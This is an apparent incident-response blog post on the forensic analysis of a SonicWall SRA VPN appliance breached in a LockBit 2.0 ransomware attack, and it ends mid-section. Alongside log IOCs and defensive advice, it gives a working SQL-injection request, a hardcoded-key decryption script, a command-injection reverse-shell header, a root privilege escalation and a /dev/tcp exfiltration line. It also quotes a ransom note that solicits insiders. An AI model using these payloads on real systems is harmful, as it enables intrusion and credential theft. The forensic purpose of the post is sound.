<figure class="wp-block-image size-large"><a href="https://blog.compass-security.com/wp-content/uploads/2022/01/firewall-crack.jpg"><img fetchpriority="high" decoding="async" width="1024" height="614" src="https://blog.compass-security.com/wp-content/uploads/2022/01/firewall-crack-1024x614.jpg" alt="" class="wp-image-6246" srcset="https://blog.compass-security.com/wp-content/uploads/2022/01/firewall-crack-1024x614.jpg 1024w, https://blog.compass-security.com/wp-content/uploads/2022/01/firewall-crack-300x180.jpg 300w, https://blog.compass-security.com/wp-content/uploads/2022/01/firewall-crack-768x461.jpg 768w, https://blog.compass-security.com/wp-content/uploads/2022/01/firewall-crack-1536x922.jpg 1536w, https://blog.compass-security.com/wp-content/uploads/2022/01/firewall-crack-676x406.jpg 676w, https://blog.compass-security.com/wp-content/uploads/2022/01/firewall-crack.jpg 1920w" sizes="(max-width: 1024px) 100vw, 1024px" /></a></figure>



<h1 class="wp-block-heading" id="Blog:VPNApplianceForensics-WherearetheLogs?">Finding the Logs</h1>



<p>After isolating the VPN Appliance from the Internet and from the internal Network, the customer gave us the credentials for the web based administration interface.</p>



<p>Unfortunately, all log listings in the graphical interfaces were almost empty:</p>



<figure class="wp-block-image size-full"><a href="https://blog.compass-security.com/wp-content/uploads/2022/01/image2021-11-26_13-50-9.png"><img decoding="async" width="961" height="664" src="https://blog.compass-security.com/wp-content/uploads/2022/01/image2021-11-26_13-50-9.png" alt="" class="wp-image-6223" srcset="https://blog.compass-security.com/wp-content/uploads/2022/01/image2021-11-26_13-50-9.png 961w, https://blog.compass-security.com/wp-content/uploads/2022/01/image2021-11-26_13-50-9-300x207.png 300w, https://blog.compass-security.com/wp-content/uploads/2022/01/image2021-11-26_13-50-9-768x531.png 768w, https://blog.compass-security.com/wp-content/uploads/2022/01/image2021-11-26_13-50-9-676x467.png 676w" sizes="(max-width: 961px) 100vw, 961px" /></a></figure>



<p>After sifting through all the available features, we found an interesting <em>Tech Support Report</em> feature under <em>System &gt; Diagnostics</em>:</p>



<figure class="wp-block-image size-full is-style-default"><a href="https://blog.compass-security.com/wp-content/uploads/2022/01/image2021-11-26_13-53-18.png"><img decoding="async" width="658" height="370" src="https://blog.compass-security.com/wp-content/uploads/2022/01/image2021-11-26_13-53-18-edited.png" alt="" class="wp-image-6235" srcset="https://blog.compass-security.com/wp-content/uploads/2022/01/image2021-11-26_13-53-18-edited.png 658w, https://blog.compass-security.com/wp-content/uploads/2022/01/image2021-11-26_13-53-18-edited-300x169.png 300w" sizes="(max-width: 658px) 100vw, 658px" /></a></figure>



<p>The feature downloads a ZIP file containing interesting logs of the system and an export of its configuration:</p>



<pre class="wp-block-code"><code>status.txt
persist.db.log.1
mcd.log.1
eventlog.1
geoBotD.log.1
tunneld.conf
tunneld.log
vmctl.log
wafStats.db.log
smtp.conf
sonicfiles.log
sso_proxy.log
temp.db.log
settings.json
smm.log
mcd.log
nxlog.log
persist.db.log
kernel.log
logrotate.conf
logrotateVA.conf
httpd.log
httpd.log.1
geoBotD.log
ha.log
html5Client.log
examples.db.log
firebase.conf
firebase.log
ftpd.log
dhcpc.log
dtls.log
eventlog
boot.log
clientsDownload.log</code></pre>



<p>These logs hold very valuable information,&nbsp;<strong>if and only if the system was not shut down</strong>. The following files in particular were of interest:</p>



<h2 class="wp-block-heading">eventlog</h2>



<p>The <code>eventlog</code> records successful and failed logins on both the VPN and the web interface. The following information is also recorded:</p>



<ul class="wp-block-list"><li>timestamp</li><li>username</li><li>source IP address</li></ul>



<pre class="wp-block-code horizontal-scroll"><code>Nov 26 11:26:26 sslvpn SSLVPN: id=sslvpn sn=&#91;CUT-BY-COMPASS] time="2021-11-26 09:26:26" vp_time="2021-11-26 09:26:26 UTC" fw=10.100.132.2 pri=5 m=1 c=1 src=&#91;CUT-BY-COMPASS] dst=&#91;CUT-BY-COMPASS] user="xyz" usr="xyz" msg="User login successful" portal="VirtualOffice" domain="&#91;CUT-BY-COMPASS]" agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36"
Nov 26 11:28:02 sslvpn SSLVPN: id=sslvpn sn=&#91;CUT-BY-COMPASS] time="2021-11-26 09:28:02" vp_time="2021-11-26 09:28:02 UTC" fw=10.100.132.2 pri=5 m=1 c=1 src=&#91;CUT-BY-COMPASS] dst=&#91;CUT-BY-COMPASS] user="xyz" usr="xyz" msg="User login successful" portal="VirtualOffice" domain="&#91;CUT-BY-COMPASS]" agent="SonicWALL NetExtender for Windows 10.2.315 (compatible; MSIE 7.0; Windows NT 6.0; SLCC1)"
Nov 26 11:28:05 sslvpn SSLVPN: id=sslvpn sn=&#91;CUT-BY-COMPASS] time="2021-11-26 09:28:05" vp_time="2021-11-26 09:28:05 UTC" fw=10.100.132.2 pri=5 m=0 c=1200 src=&#91;CUT-BY-COMPASS] dst=10.100.132.2 user="xyz" usr="xyz" msg="Start NetExtender connection" agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0"
Nov 26 11:28:05 sslvpn SSLVPN: id=sslvpn sn=&#91;CUT-BY-COMPASS] time="2021-11-26 09:28:05" vp_time="2021-11-26 09:28:05 UTC" fw=10.100.132.2 pri=5 m=0 c=1200 src=&#91;CUT-BY-COMPASS] dst=10.100.132.2 user="Proxy" usr="Proxy" msg="23717:Returning 200 OK Status" agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0"
Nov 26 11:28:06 sslvpn SSLVPN: id=sslvpn sn=&#91;CUT-BY-COMPASS] time="2021-11-26 09:28:06" vp_time="2021-11-26 09:28:06 UTC" fw=10.100.132.2 pri=5 m=18 c=101 src=&#91;CUT-BY-COMPASS] dst=&#91;CUT-BY-COMPASS] user="xyz" usr="xyz" msg="NetExtender connected" rule=access-policy proto=NetExtender agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0"
Nov 27 11:07:39 sslvpn SSLVPN: id=sslvpn sn=C0EAE4915E4C time="2021-11-27 10:07:39" vp_time="2021-11-27 10:07:39 UTC" fw=10.100.132.2 pri=5 m=3 c=3 src=10.100.132.55 dst=10.100.132.2 user="asd" usr="asd" msg="Login failed - Incorrect username/password" agent="Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:93.0) Gecko/20100101 Firefox/93.0"
Nov 27 11:35:43 sslvpn SSLVPN: id=sslvpn sn=C0EAE4915E4C time="2021-11-27 10:35:43" vp_time="2021-11-27 10:35:43 UTC" fw=10.100.132.2 pri=5 m=1 c=1 src=10.100.132.55 dst=10.100.132.2 user="admin" usr="admin" msg="User login successful" portal="VirtualOffice" domain="LocalDomain" agent="Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:93.0) Gecko/20100101 Firefox/93.0"
</code></pre>



<h2 class="wp-block-heading">mcd.log</h2>



<p>The <code>mcd.log</code> records successful VPN connections. The following information is also recorded:</p>



<ul class="wp-block-list"><li>assigned IP address from the VPN IP address pool</li><li>username </li><li>source IP address from where the connection was established</li></ul>



<pre class="wp-block-code horizontal-scroll"><code>2021-11-26 09:28:06:mcd 23888: MCD launched &#91;RIP:10.100.132.100;UNAME:xyz;CIP:&#91;CUT-BY-COMPASS]]
2021-11-26 09:28:08:mcd 23888: SSL VPN: Connected
2021-11-26 10:11:08:mcd 23888: Signal Recd (2). Exiting...
2021-11-26 10:11:08:mcd 23888: Cleaned up routes and proxy arp
2021-11-26 10:11:08:mcd 23888: NxSession sync'd up
2021-11-26 10:11:08:mcd 23888: Stat files cleaned up
2021-11-26 10:11:08:mcd 23888: MCD shutdown.</code></pre>



<p>This log went back to the last start of the system, therefore giving a very long audit trail.</p>



<h2 class="wp-block-heading">httpd.log</h2>



<p>The <code>httpd.log</code> records requests to the web server. This included traces of used exploit techniques. We will now dive into these.</p>



<h1 class="wp-block-heading">Reconstructing the Attack</h1>



<p>Through analysis of the event logs, suspicious logons could be identified. The source IP address was located in countries where the customer had no employees and the logon times were unusual and matched with the Ransomware attack. However, it was at first not clear if the attacker obtained credentials through phishing or through a vulnerability in the VPN appliance.</p>



<p>The appliance was not on the company&#8217;s inventory and therefore they were not aware that an EOL device was running in their network.</p>



<p>Hence we searched online to see if there were known flaws in this particular firmware version.</p>



<h2 class="wp-block-heading">Unauthenticated SQL Injection</h2>



<p>The used firmware was vulnerable to an unauthenticated SQL injection, that allows to read cached credentials of active sessions from the database. For more information about this issues, check the <a href="https://www.crowdstrike.com/blog/how-ecrime-groups-leverage-sonicwall-vulnerability-cve-2019-7481/">writeup by Crowdstrike</a>. SonicWall <a href="https://psirt.global.sonicwall.com/vuln-detail/SNWLID-2021-0017">issued a patch</a> for this issue. However, because the SRA 4600 appliance is considered End-of-Life, no Firmware upgrade was released for the device.</p>



<p>The leaked cached credentials are plaintext VPN user passwords, encrypted with a key that is hardcoded in the appliances firmware. The following request was crafted based on the vulnerability writeup. It allowed us to test the exploitability against the SRA appliance:</p>



<pre class="wp-block-code"><code>POST /cgi-bin/supportInstaller HTTP/1.1
Host: 10.100.132.2
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: de,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 126
 
fromEmailInvite=1&amp;customerTID="impossible'+UNION+SELECT+0,0,userType,userName,0,password,0,0+FROM+Sessions+LIMIT+1+OFFSET+0--"</code></pre>



<p>If there is a session on the device, the encrypted password is returned in the <em>supportcode </em>JavaScript  variable:</p>



<pre class="wp-block-code"><code>HTTP/1.1 200 OK
Date: Fri, 26 Nov 2021 14:40:21 GMT
Server: SonicWALL SSL-VPN Web Server
X-FRAME-OPTIONS: SAMEORIGIN
X-XSS-Protection: 1; mode=block
Content-Security-Policy: script-src https://*.duosecurity.com 'self' 'unsafe-inline' 'unsafe-eval'; object-src 'self'; style-src 'self' 'unsafe-inline'
Referrer-Policy: strict-origin
X-Content-Type-Options: nosniff
Connection: close
Content-Type: text/html; charset=UTF-8
Content-Length: 3141
 
&#91;CUT BY COMPASS}
&lt;script src="/js/schemeurl.9.0.0.5-19sv.js" type="text/javascript" charset="utf-8"&gt;&lt;/script&gt;
&lt;script&gt;
var servername = "10.100.132.2";
var port = "443";
var strsession = "";
var serverversion = "150994952";
var username = "admin";
var portalname = "2";
var userdomain = "";
var supportcode = "2D0A5C61578B2D70FEA65F4C5868A8DAA2ECB2DB9D203EEE";
var ticket = "&amp;00000000000000053610&gt;&gt;50000:46000000000008000;0000000000Pq0000000070000000000ee0400000000000ø000980000000";
var expertname = "0";
var fullControl = "4";
 
var sonicwallSMAConnectAgentVersion = "1.1.25";
&#91;CUT BY COMPASS]</code></pre>



<p>The encrypted password can be decrypted using a simple python script (based on the CrowdStrike writeup):</p>



<pre class="wp-block-code"><code># use python3 and pip install pycryptodomex
from Cryptodome.Cipher import DES
 
def des_decrypt(ct):
  key = b'\x2f\x4f\x2a\x86\xd5\x52\xf8\x80'
  cipher = DES.new(key, DES.MODE_CBC, iv=b'\x00'*8)
  return cipher.decrypt(ct)
 
def decrypt_hex_to_str(h):
  pt = des_decrypt(bytes.fromhex(h))
  return pt.rstrip(b'\x00').decode()
 
password_enc = '2D0A5C61578B2D70FEA65F4C5868A8DAA2ECB2DB9D203EEE'
 
password = decrypt_hex_to_str(password_enc)
print(password)</code></pre>



<p>If there is no valid session, an HTTP error 500 is returned.  This server error leaves valuable evidence in the <code>httpd.log</code>:</p>



<pre class="wp-block-code horizontal-scroll"><code>&#91;Fri Nov 26 11:19:44 2021] &#91;error] &#91;client 10.100.132.55] Premature end of script headers: supportInstaller
</code></pre>



<p>This can be used as an IOC (Indicator of compromise), as attackers likely enumerate all active sessions and trigger this error. The logs of the appliance we looked at had these entries occurring periodically. <strong>This indicates the attackers were regularly collection plain text passwords over a longer period of time.</strong></p>



<h2 class="wp-block-heading">Authenticated OS Command Injection</h2>



<p>Another log entry in the <code>httpd.log</code> caught our attention:</p>



<pre class="wp-block-code horizontal-scroll"><code>httpd.log:&#91;Fri Nov 26 11:36:21 2021] &#91;error] &#91;client 10.100.132.55] sh: line 4: syntax error near unexpected token `(', referer: https://10.100.132.2/
httpd.log:&#91;Fri Nov 26 11:36:21 2021] &#91;error] &#91;client 10.100.132.55] sh: line 4: `HTTP_USER_AGENT=Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:93.0) Gecko/20100101 Firefox/93.0', referer: https://10.100.132.2/
</code></pre>



<p>This hints to a failed command injection with the user agent header involved. Several GitHub repositories with exploits for a similar vulnerabilities can be found:</p>



<ul class="wp-block-list"><li><a href="https://github.com/darrenmartyn/visualdoor">https://github.com/darrenmartyn/visualdoor</a></li><li><a href="https://github.com/0xf4n9x/SonicWall_SSL-VPN_EXP">https://github.com/0xf4n9x/SonicWall_SSL-VPN_EXP</a></li></ul>



<p>However, the URL paths used in these exploits returned an HTTP 404 error on the analyzed SRA. This means, the appliance is probably not vulnerable for this vulnerability. So, the hunt goes on&#8230;</p>



<p>After analyzing the configuration some more, we found a hint in the <em>Bookmarks</em> configuration:</p>



<figure class="wp-block-image size-full"><a href="https://blog.compass-security.com/wp-content/uploads/2022/01/image2021-12-16_9-42-10.png"><img loading="lazy" decoding="async" width="857" height="642" src="https://blog.compass-security.com/wp-content/uploads/2022/01/image2021-12-16_9-42-10-edited.png" alt="" class="wp-image-6243" srcset="https://blog.compass-security.com/wp-content/uploads/2022/01/image2021-12-16_9-42-10-edited.png 857w, https://blog.compass-security.com/wp-content/uploads/2022/01/image2021-12-16_9-42-10-edited-300x225.png 300w, https://blog.compass-security.com/wp-content/uploads/2022/01/image2021-12-16_9-42-10-edited-768x575.png 768w, https://blog.compass-security.com/wp-content/uploads/2022/01/image2021-12-16_9-42-10-edited-676x506.png 676w" sizes="(max-width: 857px) 100vw, 857px" /></a></figure>



<p>Bookmarks can be used to configure a link to a service in the internal network: SSH, RDP, SMB for instance. These links are then available on the SSL VPN &#8220;Virtual Office&#8221; web portal and can be accessed easily by end-users through the browser.</p>



<p>Here the attackers seemed to exploit a command injection vulnerability in the MAC address field of a Wake-On-Lan feature of the RDP Bookmark. There is actually an input validation that prohibits the creation of such an arbitrary MAC addresses, but it is only implemented in client-side JavaScript. This can therefore be bypassed easily, for example by submitting the form manually with the JavaScript debug console:</p>



<figure class="wp-block-image size-full"><a href="https://blog.compass-security.com/wp-content/uploads/2022/01/image2021-12-16_11-41-8.png"><img loading="lazy" decoding="async" width="804" height="937" src="https://blog.compass-security.com/wp-content/uploads/2022/01/image2021-12-16_11-41-8.png" alt="" class="wp-image-6217" srcset="https://blog.compass-security.com/wp-content/uploads/2022/01/image2021-12-16_11-41-8.png 804w, https://blog.compass-security.com/wp-content/uploads/2022/01/image2021-12-16_11-41-8-257x300.png 257w, https://blog.compass-security.com/wp-content/uploads/2022/01/image2021-12-16_11-41-8-768x895.png 768w, https://blog.compass-security.com/wp-content/uploads/2022/01/image2021-12-16_11-41-8-676x788.png 676w" sizes="(max-width: 804px) 100vw, 804px" /></a></figure>



<p>The payload&nbsp;<code>0a:00:27:00:00:01`env|sh`&nbsp;</code>executes the&nbsp;<code>env</code><strong>&nbsp;</strong>command in a subshell. This prints all environment variables and pipes it into the shell&nbsp;<code>sh</code>, therefore interpreting and executing all environment variables as shell commands. Because the Wake-On-Lan command is executed in a <code>cgi-bin</code> environment, the <code>env </code>command prints the following variables:</p>



<pre class="wp-block-code"><code>SERVER_SIGNATURE=
HTTP_SEC_FETCH_DEST=document
HTTP_USER_AGENT=Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0
SERVER_PORT=443
HTTP_HOST=10.100.132.2
DOCUMENT_ROOT=/usr/src/EasyAccess/www/htdocs
SCRIPT_FILENAME=/usr/src/EasyAccess/www/cgi-bin/tscbookmark
HTTPS=on
REQUEST_URI=/cgi-bin/tscbookmark?method=html5&amp;bmId=10&amp;swcctn=1&#91;CUT BY COMPASS]s
SCRIPT_NAME=/cgi-bin/tscbookmark
SCRIPT_URI=https://10.100.132.2/cgi-bin/tscbookmark
HTTP_CONNECTION=close
REMOTE_PORT=37872
WAF_NOT_LICENSED=1
PATH=/bin:/sbin:/usr/bin:/usr/sbin
HTTP_TE=trailers
_=/usr/bin/env
SCRIPT_URL=/cgi-bin/tscbookmark
&#91;CUT BY COMPASS]</code></pre>



<p>Most of them are interpreted as valid shell statements; they define shell variables. On the line that starts with <code>HTTP_USER_AGENT</code>, spaces break the shell statement and triggers an error in the log that can be used an an IOC:</p>



<pre class="wp-block-code horizontal-scroll"><code>&#91;Thu Dec 16 11:40:36 2021] &#91;error] &#91;client 10.100.132.55] sh: line 4: syntax error near unexpected token `(', referer: https://10.100.132.2/
&#91;Thu Dec 16 11:40:36 2021] &#91;error] &#91;client 10.100.132.55] sh: line 4: `HTTP_USER_AGENT=Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0', referer: https://10.100.132.2/
</code></pre>



<p>Because the <code>User-Agent</code> header is under control of the attacker, he can inject shell commands by inserting a malicious values in the request that triggers the execution of the Wake-On-Lan command.</p>



<p>To trigger the vulnerability, the bookmark is clicked on the &#8220;Virtual Office&#8221; portal of the according user:</p>



<figure class="wp-block-image size-large"><a href="https://blog.compass-security.com/wp-content/uploads/2022/01/image2021-12-16_12-13-43.png"><img loading="lazy" decoding="async" width="1024" height="526" src="https://blog.compass-security.com/wp-content/uploads/2022/01/image2021-12-16_12-13-43-1024x526.png" alt="" class="wp-image-6216" srcset="https://blog.compass-security.com/wp-content/uploads/2022/01/image2021-12-16_12-13-43-1024x526.png 1024w, https://blog.compass-security.com/wp-content/uploads/2022/01/image2021-12-16_12-13-43-300x154.png 300w, https://blog.compass-security.com/wp-content/uploads/2022/01/image2021-12-16_12-13-43-768x394.png 768w, https://blog.compass-security.com/wp-content/uploads/2022/01/image2021-12-16_12-13-43-676x347.png 676w, https://blog.compass-security.com/wp-content/uploads/2022/01/image2021-12-16_12-13-43.png 1093w" sizes="(max-width: 1024px) 100vw, 1024px" /></a></figure>



<p>Multiple request are sent to the server. The one of interest is the request to&nbsp;<code>/cgi-bin/tscbookmark</code>. Here, a reverse shell is started:</p>



<pre class="wp-block-code"><code>GET /cgi-bin/tscbookmark?method=html5&amp;bmId=10&amp;swcctn=1&#91;CUT BY COMPASS]Z HTTP/1.1
Host: 10.100.132.2
Cookie: &#91;CUT BY COMPASS]
User-Agent: bla;bash -i &gt;&amp; /dev/tcp/10.100.132.55/12345 0&gt;&amp;1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://10.100.132.2/
Te: trailers
Connection: close</code></pre>



<p><strong>Because bookmarks can be created by standard SSL VPN users, this attack can be used to elevate privileges and extract the appliance configuration that holds interesting information and potentially other credentials. </strong>The vulnerability seems not to be exploitable without prior authentication.</p>



<h1 class="wp-block-heading">Analyzing the SRA System</h1>



<p>The next important step was to check the system in depth to see which credentials were stored and potentially could be obtained by the attacker.</p>



<h2 class="wp-block-heading">Elevating Privileges to root</h2>



<p>The analysis was performed through the reverse shell obtained with the OS command injection vulnerability. This shell is running  under user <code>nobody</code>. This means not all files on the system can be accessed:</p>



<pre class="wp-block-code"><code>$ nc -l 12345
bash: no job control in this shell
bash-4.2$ whoami
nobody</code></pre>



<p>To overcome this issue, a privilege escalation was performed on the system to obtain root rights. We searched for executables writeable by everyone with the command <code>find . -type f -perm 777 2&gt;/dev/null</code> and found shell script that is invoked automatically by the <code>root</code> user, when accessing certificate management on the admin interface:</p>



<pre class="wp-block-code"><code>lrwxrwxrwx 1 root nobody 21 Feb 11 2021 /etc/EasyAccess/var/cert/password.sh -&gt; newcert-3/password.sh
-rwxrwxrwx 1 root root 21 Dec 16 15:21 /etc/EasyAccess/var/cert/newcert-3/password.sh
</code></pre>



<p>The content of the script was replaced with a reverse shell payload and was&nbsp;invoked by accessing the certificate management on the admin interface:</p>



<figure class="wp-block-image size-full"><a href="https://blog.compass-security.com/wp-content/uploads/2022/01/image2021-12-16_15-19-11.png"><img loading="lazy" decoding="async" width="883" height="497" src="https://blog.compass-security.com/wp-content/uploads/2022/01/image2021-12-16_15-19-11-edited.png" alt="" class="wp-image-6244" srcset="https://blog.compass-security.com/wp-content/uploads/2022/01/image2021-12-16_15-19-11-edited.png 883w, https://blog.compass-security.com/wp-content/uploads/2022/01/image2021-12-16_15-19-11-edited-300x169.png 300w, https://blog.compass-security.com/wp-content/uploads/2022/01/image2021-12-16_15-19-11-edited-768x432.png 768w, https://blog.compass-security.com/wp-content/uploads/2022/01/image2021-12-16_15-19-11-edited-676x380.png 676w" sizes="(max-width: 883px) 100vw, 883px" /></a></figure>



<p>The <strong>obtained reverse shell was running with root permissions</strong>:</p>



<pre class="wp-block-code"><code>$ nc -l 9876
bash: no job control in this shell
bash-4.2# whoami
whoami
root
</code></pre>



<p>Note that this backdoor is persisted over reboots.</p>



<h2 class="wp-block-heading">Finding Stored Credentials</h2>



<p>The administrative web application is run as a cgi-bin based application. The callable endpoints are located in the folder&nbsp;<code>/usr/src/EasyAccess/www/cgi-bin</code>. They are small compiled binaries that call the main logic of the SRA in the shared library located at&nbsp;<code>/lib/libSys.so</code>. To store data, a persistent (<code>/etc/EasyAccess/var/conf/persist.db</code>) and a non-persistent (<code>/tmp/temp.db</code>) SQLight database is used.&nbsp; All these files can be exfiltrated, for instance by sending them to a remote host via TCP (<code>cat /tmp/temp.db &gt; /dev/tcp/10.100.132.55/23456</code>) or encoding / decoding them with base64 to stdout (<code>openssl base64 -in temp.db</code>).</p>



<p>The <code>temp.db</code> contains the session credentials that could be exfiltrated with the SQL Injection attack described above.</p>



<p>The <code>persist.db</code> is storing the applications configuration. It can also be exported in JSON format (named <code>settings.json</code>) in the diagnostic export or in the settings export feature on the admin interface.</p>



<p>Credentials used to connect to the Active Directory (AD) were found in the <code>Domains_AD</code> table. The password is encrypted with the same hardcoded key as for the sessions above and therefore must be seen as compromised.</p>



<figure class="wp-block-image size-full"><a href="https://blog.compass-security.com/wp-content/uploads/2022/01/image2021-12-16_16-40-43.png"><img loading="lazy" decoding="async" width="818" height="165" src="https://blog.compass-security.com/wp-content/uploads/2022/01/image2021-12-16_16-40-43.png" alt="" class="wp-image-6231" srcset="https://blog.compass-security.com/wp-content/uploads/2022/01/image2021-12-16_16-40-43.png 818w, https://blog.compass-security.com/wp-content/uploads/2022/01/image2021-12-16_16-40-43-300x61.png 300w, https://blog.compass-security.com/wp-content/uploads/2022/01/image2021-12-16_16-40-43-768x155.png 768w, https://blog.compass-security.com/wp-content/uploads/2022/01/image2021-12-16_16-40-43-676x136.png 676w" sizes="(max-width: 818px) 100vw, 818px" /></a></figure>



<p>Other credentials named <code>securePasswd </code>were found in the Users table:</p>



<figure class="wp-block-image size-large"><a href="https://blog.compass-security.com/wp-content/uploads/2022/01/image2021-12-16_16-46-57.png"><img loading="lazy" decoding="async" width="1024" height="656" src="https://blog.compass-security.com/wp-content/uploads/2022/01/image2021-12-16_16-46-57-1024x656.png" alt="" class="wp-image-6230" srcset="https://blog.compass-security.com/wp-content/uploads/2022/01/image2021-12-16_16-46-57-1024x656.png 1024w, https://blog.compass-security.com/wp-content/uploads/2022/01/image2021-12-16_16-46-57-300x192.png 300w, https://blog.compass-security.com/wp-content/uploads/2022/01/image2021-12-16_16-46-57-768x492.png 768w, https://blog.compass-security.com/wp-content/uploads/2022/01/image2021-12-16_16-46-57-676x433.png 676w, https://blog.compass-security.com/wp-content/uploads/2022/01/image2021-12-16_16-46-57.png 1262w" sizes="(max-width: 1024px) 100vw, 1024px" /></a></figure>



<p>By inspecting the related code in <code>libSys.so</code>, it was found that this data is generated by the password hashing function PKCS5_PBKDF2_HMAC using a hardcoded salt, 256 bit key and 12800 iterations:</p>



<figure class="wp-block-image size-large"><a href="https://blog.compass-security.com/wp-content/uploads/2022/01/image2021-12-16_16-50-52.png"><img loading="lazy" decoding="async" width="1024" height="682" src="https://blog.compass-security.com/wp-content/uploads/2022/01/image2021-12-16_16-50-52-1024x682.png" alt="" class="wp-image-6229" srcset="https://blog.compass-security.com/wp-content/uploads/2022/01/image2021-12-16_16-50-52-1024x682.png 1024w, https://blog.compass-security.com/wp-content/uploads/2022/01/image2021-12-16_16-50-52-300x200.png 300w, https://blog.compass-security.com/wp-content/uploads/2022/01/image2021-12-16_16-50-52-768x512.png 768w, https://blog.compass-security.com/wp-content/uploads/2022/01/image2021-12-16_16-50-52-676x450.png 676w, https://blog.compass-security.com/wp-content/uploads/2022/01/image2021-12-16_16-50-52.png 1252w" sizes="(max-width: 1024px) 100vw, 1024px" /></a></figure>



<p>An attacker can&#8217;t reverse the key-derivation function, but can perform offline brute force attacks. However, this is slow due to the algorithm and the used iterations. Therefore, we assumed the attacker did not have access to the cleartext credentials.</p>



<p>Lastly, the root password was found in the<strong>&nbsp;</strong><code>/etc/shadow</code>&nbsp;file, hashed using a simple Linux MD5 algorithm:</p>



<pre class="wp-block-code"><code>bash-4.2# cat /etc/shadow
cat /etc/shadow
root:$1$nRh/kvy.$QGgtuH.UQBnBpu0IuL9ze.:13983:0:99999:7:::
bin:x:13937:0:99999:7:::
daemon:x:13937:0:99999:7:::
mail:x:13937:0:99999:7:::
squid:x:13937:0:99999:7:::
ntp:x:13937:0:99999:7:::
sshd:x:13937:0:99999:7:::
nobody:x:13937:0:99999:7:::
snort:x:13937:0:99999:7:::
logwatch:x:13937:0:99999:7:::
dnsmasq:x:13937:0:99999:7:::
cron:x:13937:0:99999:7:::
admin::13937:0:99999:7:::</code></pre>



<p>Bruteforcing it with John the Ripper showed that password was &#8220;password&#8221;.<br>This may be a factory default, but is not exploitable, since the root user can&#8217;t be used to logon to the system.</p>



<h2 class="wp-block-heading">Searching for Malicious Activity</h2>



<p>Unfortunately, it was not possible to reconstruct what commands the attacker executed on the system.</p>



<p>No signs of persistence or malicious activity was detected by quickly analyzing the filesystem timestamps (searching for recently created files) or the running processes over the root shell. However, we did not perform a thorough analysis of the system.</p>



<h1 class="wp-block-heading">Takeaways</h1>



<p>These forensic evidences helped during the analysis of the Ransomware attack, as it allowed to define good IOCs which could be searched for on the corporate systems:</p>



<ul class="wp-block-list"><li>Date and time when attacks were performed, obtained from the SRA logs.</li><li>Internal IP address of the SRA itself and the IP address range of the VPN pool obtainable in the configuration.</li><li>Suspicious external IP addresses used to connect to the SRA obtainable from the SRA log data.</li><li>Compromised accounts identified through VPN logons from suspicious IP addresses in the SRA log data.</li><li>Potentially compromised accounts where credentials were stored on the SRA with the reversible DES encryption.</li></ul>



<p>Generally the following actions can be recommended if a VPN appliance is found to be compromised:</p>



<ul class="wp-block-list"><li><strong>Don&#8217;t reboot the appliance</strong>, important information will be lost. Rather isolate the system, so that no inbound and outbound connection to untrusted or sensitive systems are possible.</li><li>Replace the VPN appliance if it is End-of-Life!</li></ul>



<p>Specifically for SonicWall SRA, the following actions can help during a forensic investigation:</p>



<ul class="wp-block-list"><li>Perform the diagnostics export, analyze the logs and check for stored credentials that can be easily decrypted.</li><li>Perform the revers shell attack to export the <code>temp.db</code> and check for stored credentials that can be easily decrypted. (No root shell access is required for this, as the database is readable by the nobody user.)</li></ul>



<h1 class="wp-block-heading">Notes on Lockbit 2.0 Ransomware</h1>



<p>The attackers abused the SRA vulnerability to gain access to the customers network. The compromised users were AD users and could be used to logon to other Windows systems. Through Windows credentials dumping they obtained the Domain Admin credentials, which unfortunately were the same used for the root user of the ESXi server.<br>Therefore the attackers were able to logon to the ESXi Hypervisor and ran the LockBit 2.0 Ransomware.</p>



<p>They left following file named <code>!!!-Restore-My-Files-!!!</code> that threatens the customer to leak its data and also contains an interesting advertisement for future criminals. It claims LockBit 2.0 to be the fasted ransomware:</p>



<pre class="wp-block-preformatted">~~~ LockBit 2.0 the fastest ransomware in the world ~~~
 
&gt;&gt;&gt;&gt; Your data are stolen and encrypted
The data will be published on TOR website if you do not pay the ransom
 
[CUT BY COMPASS]
 
&gt;&gt;&gt;&gt; Advertisement
 
Would you like to earn millions of dollars $$$ ?
 
Our company acquire access to networks of various companies, as well as insider information that can help you steal the most valuable data of any company.
You can provide us accounting data for the access to any company, for example, login and password to RDP, VPN, corporate email, etc.
Open our letter at your email. Launch the provided virus on any computer in your company.
 
You can do it both using your work computer or the computer of any other employee in order to divert suspicion of being in collusion with us.
 
Companies pay us the foreclosure for the decryption of files and prevention of data leak.
[CUT BY COMPASS]</pre>



<p>Indeed after checking the timestamps of the Lockbit files, it turned out that the attacker only required 5 minutes to encrypt all files. Fully encrypting all VMDKs of a ESXi Hypervisor should require more time, so we checked the encryption of the VMDKs and of some log files that had the <code>.lockbit</code> suffix appended to them. </p>



<p>Quickly running the command <code>strings</code> or opening the files in an editor, showed that major parts of the files were not encrypted. Here are some entropy analysis performed with <code>Detect It Easy</code>:</p>



<p>Log file:</p>



